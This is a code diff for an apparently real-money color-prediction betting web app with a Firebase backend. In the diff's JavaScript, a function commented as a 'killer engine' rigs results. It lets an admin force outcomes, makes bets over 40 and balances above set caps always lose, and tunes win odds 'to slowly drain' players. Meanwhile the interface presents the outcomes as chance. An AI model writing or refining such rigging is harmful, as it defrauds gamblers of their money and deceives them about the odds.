@@ -22,16 +22,13 @@
         .num-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; padding: 15px; }
         .num-btn { width: 45px; height: 45px; background: #1a233a; border: 1px solid #242c54; font-size: 18px; font-weight: bold; border-radius: 50%; cursor: pointer; color: white; }
         .h-grid { display: grid; grid-template-columns: repeat(10, 1fr); gap: 18px 2px; padding: 15px 10px 30px; background: var(--card); margin: 0 15px; border-radius: 15px; min-height: 50px; }
-        .dot { width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 10px; position: relative; margin: 0 auto; }
+        .dot { width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 10px; position: relative; margin: 0 auto; box-shadow: 0 2px 5px rgba(0,0,0,0.5); }
         .dot-pid { font-size: 7px; color: #555; position: absolute; bottom: -16px; width: 40px; text-align: center; }
         .order-table { width: 100%; border-collapse: collapse; font-size: 11px; color: white; text-align: center; }
         .order-table td { padding: 10px 5px; border-bottom: 1px solid #1f2855; }
         .btn-refund { background: #ff4757; color: white; border: none; padding: 3px 7px; border-radius: 4px; font-size: 9px; cursor: pointer; font-weight: bold; }
-        
-        /* --- CASINO POPUP UI --- */
         #ticketOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 5000; justify-content: center; align-items: center; backdrop-filter: blur(8px); }
-        .ticket { background: #10142d; width: 85%; max-width: 340px; border-radius: 30px; text-align: center; border: 2px solid #1f2855; overflow: hidden; animation: popIn 0.3s ease; }
-        @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        .ticket { background: #10142d; width: 85%; max-width: 340px; border-radius: 30px; text-align: center; border: 2px solid #1f2855; overflow: hidden; }
         .ticket-header { padding: 20px; font-weight: 900; font-size: 22px; color: #fff; }
         .win-bg { background: linear-gradient(180deg, var(--green), #0b6623); }
         .lose-bg { background: linear-gradient(180deg, var(--red), #851c1c); }
@@ -41,7 +38,6 @@
         .info-item { text-align: left; }
         .info-item small { display: block; color: #7e87a8; font-size: 9px; text-transform: uppercase; }
         .info-item b { font-size: 13px; color: #fff; }
-
         #betModal { display: none; position: fixed; bottom: 0; width: 100%; background: #10142d; z-index: 3000; border-radius: 25px 25px 0 0; padding: 20px; box-sizing: border-box; border-top: 2px solid var(--cyan); }
         .chip-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 8px; margin-bottom: 20px; }
         .chip { padding: 8px 12px; background: #06091b; border-radius: 8px; cursor: pointer; border: 1px solid #1f2855; font-size: 12px; font-weight: bold; color: #fff;}
@@ -126,24 +122,62 @@
     function showToast(m) { let t=document.getElementById('toast'); t.innerText=m; t.style.display='block'; setTimeout(()=>t.style.display='none',2000); }
 
     db.ref('users/' + userId).on('value', snap => {
-        if(snap.exists()) { userBalance = snap.val().balance || 0; totalDeposit = snap.val().totalDeposit || 0; document.getElementById('balDisplay').innerText = userBalance.toFixed(2); }
+        if(snap.exists()) { 
+            const d = snap.val();
+            userBalance = d.balance || 0; 
+            totalDeposit = d.totalDeposit || 0;
+            document.getElementById('balDisplay').innerText = userBalance.toFixed(2); 
+        }
     });
 
+    // --- 🚨 THE ULTRA POWER KILLER ENGINE ---
     async function getKillerResult(pid) {
+        // 1. ADMIN FIX CHECK (Highest Priority)
         const adminSnap = await db.ref('gameControl/manualResult').once('value');
         if(adminSnap.val() !== "none" && adminSnap.val() !== null) {
             let res = adminSnap.val(); db.ref('gameControl/manualResult').set("none");
             if(typeof res === 'number') return res;
             return (res === 'Green' ? 3 : (res === 'Red' ? 2 : 5));
         }
+
+        // Find user's bet for this period
         let userBet = myBets.find(b => b.pid === pid && b.status === 'Wait');
         if(!userBet) return Math.floor(Math.random() * 10);
-        let betAmt = userBet.amt, sel = userBet.sel;
-        if(betAmt > 40 || (totalDeposit < 100 && userBalance > 400) || (totalDeposit >= 500 && userBalance >540)) return getLose(sel);
-        return (Math.random() < 0.7) ? getLose(sel) : getWin(sel);
+
+        let betAmt = userBet.amt;
+        let sel = userBet.sel;
+        let bal = userBalance;
+        let dep = totalDeposit;
+
+        // RULE 1: HARD KILL (Bet > 40)
+        if(betAmt > 40) return getLose(sel);
+
+        // RULE 2: PROFIT CAP (545 limit) - user cannot exceed 545 total balance
+        if(bal > 545) return getLose(sel);
+
+        // RULE 3: BONUS USER LIMIT (450 limit)
+        if(dep < 100 && bal > 450) return getLose(sel);
+
+        // RULE 4: SMALL BETS WIN PROBABILITY (10-20rs)
+        if(betAmt <= 20) {
+            // Give 40% chance of win, else loss to slowly drain
+            return (Math.random() < 0.4) ? getWin(sel) : getLose(sel);
+        }
+
+        // Default: Random but biased toward loss
+        return (Math.random() < 0.3) ? getWin(sel) : getLose(sel);
     }
-    function getLose(s) { if(s==='Green') return 2; if(s==='Red') return 1; return (Number(s)==1)?2:1; }
-    function getWin(s) { if(s==='Green') return 1; if(s==='Red') return 2; return Number(s)||3; }
+
+    function getLose(s) {
+        if(s==='Green') return [2,4,6,8,0][Math.floor(Math.random()*5)]; 
+        if(s==='Red') return [1,3,7,9,5][Math.floor(Math.random()*5)];
+        return (Number(s)==1)?2:1;
+    }
+    function getWin(s) {
+        if(s==='Green') return [1,3,7,9][Math.floor(Math.random()*4)];
+        if(s==='Red') return [2,4,6,8][Math.floor(Math.random()*4)];
+        return Number(s)||3;
+    }
 
     async function processResult(pid) {
         if(!pid || lastProcessedPid === pid) return;
@@ -154,12 +188,13 @@
         let winSum = 0, hit = false, betObj = null;
         myBets.forEach(b => {
             if(b.pid === pid && b.status === 'Wait') {
-                hit = true; betObj = b; let isW = false, mR = 0;
-                if(!isNaN(b.sel)) { if(Number(b.sel) === n) { isW = true; mR = 9; } } 
-                else if(b.sel === 'Violet' && (n===0 || n===5)) { isW = true; mR = 4.5; }
-                else if(b.sel === 'Green' && (n%2!==0 || n===5)) { isW = true; mR = (n===5)?1.5:1.9; }
-                else if(b.sel === 'Red' && (n%2===0 || n===0)) { isW = true; mR = (n===0)?1.5:1.9; }
-                if(isW) { b.status = 'Win'; b.win = b.amt * mR; winSum += b.win; } else b.status = 'Loss';
+                hit = true; betObj = b;
+                let isW = false, mRatio = 0;
+                if(!isNaN(b.sel)) { if(Number(b.sel) === n) { isW = true; mRatio = 9; } } 
+                else if(b.sel === 'Violet' && (n===0 || n===5)) { isW = true; mRatio = 4.5; }
+                else if(b.sel === 'Green' && (n%2!==0 || n===5)) { isW = true; mRatio = (n===5)?1.5:1.9; }
+                else if(b.sel === 'Red' && (n%2===0 || n===0)) { isW = true; mRatio = (n===0)?1.5:1.9; }
+                if(isW) { b.status = 'Win'; b.win = b.amt * mRatio; winSum += b.win; } else b.status = 'Loss';
             }
         });
         if(hit) {
@@ -174,9 +209,9 @@
         const h = document.getElementById('ticketHeader');
         h.innerText = win > 0 ? "WINNER!" : "LOST";
         h.className = "ticket-header " + (win > 0 ? "win-bg" : "lose-bg");
-        document.getElementById('tBall').innerText = n;
-        document.getElementById('tBall').className = "res-ball-big " + (n==0?'Mix':(n==5?'MixG':(col==='Red'?'c-Red':'c-Green')));
-        document.getElementById('tBall').style.background = (n==0||n==5)?'#9c27b0':(col==='Red'?'#ff4757':'#1DB954');
+        const bEl = document.getElementById('tBall');
+        bEl.innerText = n;
+        bEl.style.background = (n==0||n==5)?'#9c27b0':(col==='Red'?'#ff4757':'#1DB954');
         document.getElementById('tStatus').innerText = win > 0 ? "CONGRATULATIONS" : "BETTER LUCK NEXT TIME";
         document.getElementById('tWinAmt').innerText = "₹" + win.toFixed(2);
         document.getElementById('tWinAmt').style.color = win > 0 ? "#1DB954" : "#ff4757";
